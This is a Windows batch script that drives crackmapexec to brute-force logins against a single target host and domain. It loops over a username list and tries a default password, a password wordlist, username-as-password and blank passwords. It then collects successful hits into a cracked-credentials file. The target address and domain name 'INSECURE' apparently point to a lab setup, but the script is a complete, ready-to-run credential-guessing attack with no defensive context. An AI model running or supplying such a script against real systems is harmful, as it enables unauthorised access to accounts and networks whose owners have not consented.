
@echo off 

:: 1) set these variables first before running the script 

set "userlist=users.txt"
set "target=192.168.80.50"
set "domain=INSECURE"


del  cme_brute_bat.txt

:: password 
for /F "delims=" %%a in (%userlist%) do (
crackmapexec.exe %target% -u %%a  -p password  >> cme_brute_bat.txt
)
powershell "Get-Content cme_brute_bat.txt | findstr [+] | sort-object| Get-Unique > cme_brute_bat_cracked.txt

:: pass5.txt
for /F "delims=" %%a in (%userlist%) do (
crackmapexec.exe %target% -u %%a  -p pass5.txt  >> cme_brute_bat.txt
)
powershell "Get-Content cme_brute_bat.txt | findstr [+] | sort-object| Get-Unique > cme_brute_bat_cracked.txt

:: user == pass 
for /F "delims=" %%a in (%userlist%) do (
crackmapexec.exe %target% -u %%a  -p %%a >> cme_brute_bat.txt
)
powershell "Get-Content cme_brute_bat.txt | findstr [+] | sort-object| Get-Unique > cme_brute_bat_cracked.txt


:: pass_blank.txt
for /F "delims=" %%a in (%userlist%) do (
crackmapexec.exe %target% -u %%a  -p pass_blank.txt  >> cme_brute_bat.txt
)
powershell "Get-Content cme_brute_bat.txt | findstr [+] | sort-object| Get-Unique > cme_brute_bat_cracked.txt




echo ""
echo ""
echo "################ FINISHED ################"
echo ""
type cme_brute_bat_cracked.txt